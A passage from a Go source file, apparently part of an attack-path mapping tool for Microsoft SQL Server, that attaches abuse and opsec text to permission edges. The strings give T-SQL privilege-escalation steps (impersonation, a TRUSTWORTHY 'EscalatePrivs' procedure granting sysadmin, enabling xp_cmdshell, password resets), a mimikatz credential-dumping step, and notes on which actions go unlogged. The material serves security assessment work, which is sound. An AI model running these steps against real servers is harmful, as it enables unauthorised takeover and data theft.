				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17",
		}
	},

	EdgeKinds.Control: func(ctx *EdgeContext) EdgeProperties {
		var windowsAbuse, linuxAbuse, opsec string
		isDBUser := ctx.TargetTypeDescription == "WINDOWS_USER" || ctx.TargetTypeDescription == "WINDOWS_GROUP" || ctx.TargetTypeDescription == "SQL_USER" || ctx.TargetTypeDescription == "ASYMMETRIC_KEY_MAPPED_USER" || ctx.TargetTypeDescription == "CERTIFICATE_MAPPED_USER"
		isLogin := ctx.TargetTypeDescription == "WINDOWS_LOGIN" || ctx.TargetTypeDescription == "WINDOWS_GROUP" || ctx.TargetTypeDescription == "SQL_LOGIN" || ctx.TargetTypeDescription == "ASYMMETRIC_KEY_MAPPED_LOGIN" || ctx.TargetTypeDescription == "CERTIFICATE_MAPPED_LOGIN"
		if ctx.DatabaseName != "" {
			// Database-level targets
			if isDBUser {
				windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
					"USE " + ctx.DatabaseName + "; \n" +
					"EXECUTE AS USER = '" + ctx.TargetName + "' \n" +
					"   SELECT USER_NAME() \n" +
					"REVERT "
				linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
					"USE " + ctx.DatabaseName + "; \n" +
					"EXECUTE AS USER = '" + ctx.TargetName + "' \n" +
					"   SELECT USER_NAME() \n" +
					"REVERT "
				opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
					"Log events are not generated for user impersonation by default."
			} else if ctx.TargetTypeDescription == "DATABASE_ROLE" {
				windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
					"USE " + ctx.DatabaseName + "; \n" +
					"Add member: EXEC sp_addrolemember '" + ctx.TargetName + "', 'user_name'; \n" +
					"Change owner: ALTER AUTHORIZATION ON ROLE::[" + ctx.TargetName + "] TO [user_name]; "
				linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
					"USE " + ctx.DatabaseName + "; \n" +
					"Add member: EXEC sp_addrolemember '" + ctx.TargetName + "', 'user_name'; \n" +
					"Change owner: ALTER AUTHORIZATION ON ROLE::[" + ctx.TargetName + "] TO [user_name]; "
				opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
					"Log events are generated by default for additions to database role membership. Role ownership changes are not logged by default. \n" +
					"To view database role membership change logs, execute: \n" +
					"SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC; "
			} else if ctx.TargetTypeDescription == "DATABASE" {
				windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
					"USE " + ctx.TargetName + "; \n" +
					"Impersonate user: EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT; \n" +
					"Add member to role: EXEC sp_addrolemember 'role_name', 'user_name'; \n" +
					"Change owner: ALTER AUTHORIZATION ON ROLE::[role] TO [user_name]; "
				linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
					"USE " + ctx.TargetName + "; \n" +
					"Impersonate user: EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT; \n" +
					"Add member to role: EXEC sp_addrolemember 'role_name', 'user_name'; \n" +
					"Change owner: ALTER AUTHORIZATION ON ROLE::[role] TO [user_name]; "
				opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
					"Log events are not generated for user impersonation or role ownership changes by default. Log events are generated by default for additions to database role membership. " +
					"To view database role membership change logs, execute: \n" +
					"SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC; "
			}
			// Other database-level types (APPLICATION_ROLE) return empty strings
		} else {
			// Server-level targets
			if isLogin {
				windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
					"EXECUTE AS LOGIN = '" + ctx.TargetName + "' \n" +
					"   SELECT SUSER_NAME() \n" +
					"REVERT "
				linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
					"EXECUTE AS LOGIN = '" + ctx.TargetName + "' \n" +
					"   SELECT SUSER_NAME() \n" +
					"REVERT "
				opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
					"Log events are not generated for login impersonation by default."
			} else if ctx.TargetTypeDescription == "SERVER_ROLE" {
				windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
					"Add member: EXEC sp_addsrvrolemember 'login_name', '" + ctx.TargetName + "'; \n" +
					"Change owner: ALTER AUTHORIZATION ON SERVER ROLE::[" + ctx.TargetName + "] TO [login_name]; "
				linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
					"Add member: EXEC sp_addsrvrolemember 'login_name', '" + ctx.TargetName + "'; \n" +
					"Change owner: ALTER AUTHORIZATION ON SERVER ROLE::[" + ctx.TargetName + "] TO [login_name]; "
				opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
					"Log events are generated by default for additions to server role membership. Server role ownership changes are not logged by default. \n" +
					"To view server role membership change logs, execute: \n" +
					"SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass = 108 ORDER BY StartTime DESC; "
			}
		}
		return EdgeProperties{
			Traversable:  false,
			General:      "The CONTROL permission on a securable object effectively grants the source " + ctx.SourceType + " all defined permissions on the securable object and its descendent objects. CONTROL at a particular scope includes CONTROL on all securable objects under that scope (e.g., CONTROL on a database includes control of all permissions on the database as well as all permissions on all assemblies, schemas, and other objects within all schemas in the database).",
			WindowsAbuse: windowsAbuse,
			LinuxAbuse:   linuxAbuse,
			Opsec:        opsec,
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17",
		}
	},

	EdgeKinds.ChangeOwner: func(ctx *EdgeContext) EdgeProperties {
		var windowsAbuse, linuxAbuse string
		if ctx.TargetTypeDescription == "SERVER_ROLE" {
			windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"ALTER AUTHORIZATION ON SERVER ROLE::[" + ctx.TargetName + "] TO [login]; "
			linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"ALTER AUTHORIZATION ON SERVER ROLE::[" + ctx.TargetName + "] TO [login]; "
		} else if ctx.TargetTypeDescription == "DATABASE_ROLE" {
			windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"ALTER AUTHORIZATION ON ROLE::[" + ctx.TargetName + "] TO [user]; "
			linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"ALTER AUTHORIZATION ON ROLE::[" + ctx.TargetName + "] TO [user]; "
		}
		return EdgeProperties{
			Traversable:  true,
			General:      "The source " + ctx.SourceType + " can change the owner of this " + ctx.TargetType + " or descendent objects in its scope.",
			WindowsAbuse: windowsAbuse,
			LinuxAbuse:   linuxAbuse,
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Role ownership changes are not logged by default.",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17#permissions \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16",
		}
	},

	EdgeKinds.AlterAnyLogin: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: false,
			General:     "The ALTER ANY LOGIN permission on a server allows the source " + ctx.SourceType + " to change the password for any SQL login (as opposed to Windows login) that is not the fixed sa account. If the target has sysadmin or CONTROL SERVER, the principal making the change must also have sysadmin or CONTROL SERVER.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"ALTER LOGIN [login] WITH PASSWORD = 'password'; ",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"ALTER LOGIN [login] WITH PASSWORD = 'password'; ",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are not generated for password changes by default.",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-login-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17",
		}
	},

	EdgeKinds.AlterAnyServerRole: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: false,
			General:     "The ALTER ANY SERVER ROLE permission allows the source " + ctx.SourceType + " to add members to any user-defined server role as well as add members to fixed server roles that the source " + ctx.SourceType + " is a member of.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"EXEC sp_addsrvrolemember @loginame = 'login', @rolename = 'role' ",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"EXEC sp_addsrvrolemember @loginame = 'login', @rolename = 'role' ",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are generated by default for additions to server role membership. \n" +
				"To view server role membership change logs, execute: \n" +
				"SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass = 108 ORDER BY StartTime DESC; ",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17#permissions \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16",
		}
	},

	EdgeKinds.LinkedTo: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false, // Base is non-traversable; MakeInterestingEdgesTraversable overrides to true
			General:      "The source SQL Server has a linked server connection to the target SQL Server. The actual privileges available through this link depend on the authentication configuration and remote user mapping.",
			WindowsAbuse: "Query the linked server: SELECT * FROM [LinkedServerName].[Database].[Schema].[Table]; or execute commands: EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServerName]; ",
			LinuxAbuse:   "Query the linked server: SELECT * FROM [LinkedServerName].[Database].[Schema].[Table]; or execute commands: EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LinkedServerName]; ",
			Opsec:        "Linked server queries are logged in the remote server's trace log as coming from the linked server login. Errors may reveal information about the remote server configuration.",
			References:   "- https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine?view=sql-server-ver17",
		}
	},

	EdgeKinds.ExecuteAsOwner: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The source " + ctx.SourceType + " can escalate privileges to the server level by creating or modifying database objects (stored procedures, functions, or CLR assemblies) that use EXECUTE AS OWNER. Since the database is TRUSTWORTHY and owned by a highly privileged login, code executing as the owner will have those elevated server privileges.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statements:\n" +
				"USE " + ctx.DatabaseName + "; \n" +
				"GO \n" +
				"CREATE PROCEDURE dbo.EscalatePrivs \n" +
				"WITH EXECUTE AS OWNER \n" +
				"AS \n" +
				"BEGIN \n" +
				"    -- Add current login to sysadmin role \n" +
				"    EXEC sp_addsrvrolemember @loginame = '" + ctx.SourceType + "', @rolename = 'sysadmin'; \n" +
				"    -- Impersonate the sa login \n" +
				"    EXECUTE AS LOGIN = 'sa'; \n" +
				"       -- Now executing with sa privileges \n" +
				"       SELECT SUSER_NAME(): \n" +
				"       -- Perform privileged actions here \n" +
				"    REVERT; \n" +
				"END; \n" +
				"GO \n" +
				"EXEC dbo.EscalatePrivs; ",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statements:\n" +
				"USE " + ctx.DatabaseName + "; \n" +
				"GO \n" +
				"CREATE PROCEDURE dbo.EscalatePrivs \n" +
				"WITH EXECUTE AS OWNER \n" +
				"AS \n" +
				"BEGIN \n" +
				"    -- Add current login to sysadmin role \n" +
				"    EXEC sp_addsrvrolemember @loginame = '" + ctx.SourceType + "', @rolename = 'sysadmin'; \n" +
				"    -- Impersonate the sa login \n" +
				"    EXECUTE AS LOGIN = 'sa'; \n" +
				"       -- Now executing with sa privileges \n" +
				"       SELECT SUSER_NAME(): \n" +
				"       -- Perform privileged actions here \n" +
				"    REVERT; \n" +
				"END; \n" +
				"GO \n" +
				"EXEC dbo.EscalatePrivs; ",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. \n" +
				"Creating stored procedures is not logged by default. However, adding members to the sysadmin role is logged. \n" +
				"To view server role membership change logs, execute: \n" +
				"SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass = 108 ORDER BY StartTime DESC; ",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-clause-transact-sql?view=sql-server-ver17 \n" +
				"- https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet",
		}
	},

	EdgeKinds.IsTrustedBy: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false, // Base is non-traversable; MakeInterestingEdgesTraversable overrides to true
			General:      "The database " + ctx.SourceName + " has the TRUSTWORTHY property set to ON. This means that SQL Server trusts this database, allowing code within it to execute with the privileges of the database owner at the server level.",
			WindowsAbuse: "This relationship may allow privilege escalation when combined with the ability to execute code within the database if the owner has high privileges at the server level. See MSSQL_ExecuteAsOwner edges from this database for exploitation paths.",
			LinuxAbuse:   "This relationship enables privilege escalation when combined with the ability to execute code within the database if the owner has high privileges at the server level. See MSSQL_ExecuteAsOwner edges from this database for exploitation paths.",
			Opsec:        "The TRUSTWORTHY property and database ownership are not typically monitored. Exploitation through CLR assemblies, stored procedures, or functions that use EXECUTE AS OWNER will not generate specific security events by default.",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property?view=sql-server-ver17 \n" +
				"- https://docs.microsoft.com/en-us/sql/t-sql/statements/alter-database-transact-sql-set-options?view=sql-server-ver17",
		}
	},

	EdgeKinds.ServiceAccountFor: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false, // Base is non-traversable; MakeInterestingEdgesTraversable overrides to true
			General:      "The " + ctx.SourceType + " is the service account running the SQL Server service for " + ctx.TargetName + ".",
			WindowsAbuse: "Compromise of the service account grants access to the SQL Server process and potentially to stored credentials and data.",
			LinuxAbuse:   "Compromise of the service account grants access to the SQL Server process and potentially to stored credentials and data.",
			Opsec:        "Service account changes require restarting the SQL Server service.",
			References:   "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions",
		}
	},

	EdgeKinds.HostFor: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The computer " + ctx.SourceName + " hosts the target SQL Server instance " + ctx.TargetName + ".",
			WindowsAbuse: "With admin access to the host, you can access the SQL instance: \n" +
				"If the SQL instance is running as a built-in account (Local System, Local Service, or Network Service), it can be accessed with a SYSTEM context with sqlcmd. \n" +
				"If the SQL instance is running in a domain service account context, the cleartext credentials can be dumped from LSA secrets with mimikatz sekurlsa::logonpasswords, then they can be used to request a service ticket for a domain account with admin access to the SQL instance. \n" +
				"If there are no domain DBAs, it is still possible to start the instance in single-user mode, which allows any member of the computer's local Administrators group to connect as a sysadmin. WARNING: This is disruptive, possibly destructive, and will cause the database to become unavailable to other users while in single-user mode. It is not recommended.",
			LinuxAbuse: "If you have root access to the host, you can access SQL Server by manipulating the service or accessing database files directly.",
			Opsec:      "Host access allows reading memory, modifying binaries, and accessing database files directly.",
			References: "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/start-sql-server-in-single-user-mode?view=sql-server-ver17",
		}
	},

	EdgeKinds.ExecuteOnHost: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "Control of a SQL Server instance allows xp_cmdshell or other OS command execution capabilities to be used to access the host computer in the context of the account running the SQL server.",
			WindowsAbuse: "Enable and use xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'; ",
			LinuxAbuse:   "Enable and use xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'; ",
			Opsec:        "xp_cmdshell configuration option changes are logged in SQL Server error logs. View the log by executing: EXEC sp_readerrorlog 0, 1, 'xp_cmdshell'; ",
			References:   "- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17",
		}
	},

	EdgeKinds.GrantAnyPermission: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The securityadmin fixed server role can grant any server-level permission to any login, including CONTROL SERVER. This effectively allows members to grant themselves or others full control of the SQL Server instance.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as a member of securityadmin (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statements:\n" +
				"-- Grant CONTROL SERVER to yourself or another login \n" +
				"GRANT CONTROL SERVER TO [target_login]; \n" +
				"-- Or grant specific high privileges \n" +
				"GRANT IMPERSONATE ANY LOGIN TO [target_login]; \n" +
				"GRANT ALTER ANY LOGIN TO [target_login]; \n" +
				"GRANT ALTER ANY SERVER ROLE TO [target_login]; ",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as a member of securityadmin (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statements:\n" +
				"-- Grant CONTROL SERVER to yourself or another login \n" +
				"GRANT CONTROL SERVER TO [target_login]; \n" +
				"-- Or grant specific high privileges \n" +
				"GRANT IMPERSONATE ANY LOGIN TO [target_login]; \n" +
				"GRANT ALTER ANY LOGIN TO [target_login]; \n" +
				"GRANT ALTER ANY SERVER ROLE TO [target_login]; ",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. \n" +
				"Permission grants are not logged by default in the trace log.",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver17#fixed-server-level-roles \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/grant-server-permissions-transact-sql?view=sql-server-ver17 \n" +
				"- https://www.netspi.com/blog/technical-blog/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/",
		}
	},

	EdgeKinds.GrantAnyDBPermission: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The db_securityadmin fixed database role db_securityadmin can create roles, manage role memberships, and grant all database permissions, effectively granting full database control.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as a member of db_securityadmin (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statements:\n" +
				"USE " + ctx.TargetName + "; \n" +
				"   -- Create a role \n" +
				"   CREATE ROLE [EvilRole]; \n" +
				"   -- Add self \n" +
				"   EXEC sp_addrolemember 'EvilRole', 'db_secadmin'; \n" +
				"   -- Grant the role CONTROL of the database \n" +
				"   GRANT CONTROL TO [EvilRole]; \n" +
				"   -- With CONTROL, we can impersonate dbo \n" +
				"   EXECUTE AS USER = 'dbo'; \n" +
				"   	SELECT USER_NAME(); \n" +
				"   	-- Now we can add ourselves to db_owner \n" +
				"   	EXEC sp_addrolemember 'db_owner', 'db_secadmin'; \n" +
				"	    -- Or perform any other action in the database \n" +
				"   REVERT ",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as a member of db_securityadmin (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statements:\n" +
				"USE " + ctx.TargetName + "; \n" +
				"   -- Create a role \n" +
				"   CREATE ROLE [EvilRole]; \n" +
				"   -- Add self \n" +
				"   EXEC sp_addrolemember 'EvilRole', 'db_secadmin'; \n" +
				"   -- Grant the role CONTROL of the database \n" +
				"   GRANT CONTROL TO [EvilRole]; \n" +
				"   -- With CONTROL, we can impersonate dbo \n" +
				"   EXECUTE AS USER = 'dbo'; \n" +
				"   	SELECT USER_NAME(); \n" +
				"   	-- Now we can add ourselves to db_owner \n" +
				"   	EXEC sp_addrolemember 'db_owner', 'db_secadmin'; \n" +
				"	    -- Or perform any other action in the database \n" +
				"   REVERT ",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. \n" +
				"Database role membership changes are logged by default. \n" +
				"To view database role membership change logs, execute: \n" +
				"SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC; ",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-ver17#fixed-database-roles \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/create-role-transact-sql?view=sql-server-ver17",
		}
	},

	EdgeKinds.Connect: func(ctx *EdgeContext) EdgeProperties {
		var general, windowsAbuse, linuxAbuse string
		if ctx.TargetTypeDescription == "SERVER" {
			general = "The CONNECT SQL permission allows the source " + ctx.SourceType + " to connect to the " + ctx.SQLServerName + " SQL Server if the login is not disabled or currently locked out. This permission is granted to every login created on the server by default."
			windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and authenticate with valid credentials for a server login"
			linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and authenticate with valid credentials for a server login"
		} else if ctx.TargetTypeDescription == "DATABASE" {
			general = "The CONNECT permission allows the source " + ctx.SourceType + " to connect to the " + ctx.TargetName + " database. This permission is granted to every database user created in the database by default."
			windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and authenticate with valid credentials for a server login, then connect to the " + ctx.TargetName + " database by executing USE " + ctx.TargetName + "; GO; "
			linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and authenticate with valid credentials for a server login, then connect to the " + ctx.TargetName + " database by executing USE " + ctx.TargetName + "; GO; "
		}
		return EdgeProperties{
			Traversable:  false,
			General:      general,
			WindowsAbuse: windowsAbuse,
			LinuxAbuse:   linuxAbuse,
